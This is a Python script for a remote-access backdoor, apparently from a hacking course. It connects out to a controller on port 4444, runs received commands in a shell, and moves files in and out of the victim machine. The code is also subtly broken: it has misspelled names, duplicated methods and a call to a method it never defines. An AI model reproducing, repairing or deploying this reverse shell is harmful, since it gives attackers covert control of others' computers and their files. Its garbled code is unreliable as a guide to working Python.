#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connectio.recv(1024)
                return json_loads(json_data)
            except:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def execute_System_commands(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subporcess.check_output(command , shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result= self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read.file()
                elif command[0] == "upload":
                    command_result = self.write.file(command[1], command[2])
                else:
                    command_result = self.execute_System_commands(command).decode()

            except Exception as e:
                command_result = "[+] ERROR DURING THE COMMAND EXECUTION"
            self.reliable_send(command_result)

My_Backdoor = Backdoor("",4444)
My_Backdoor.run()

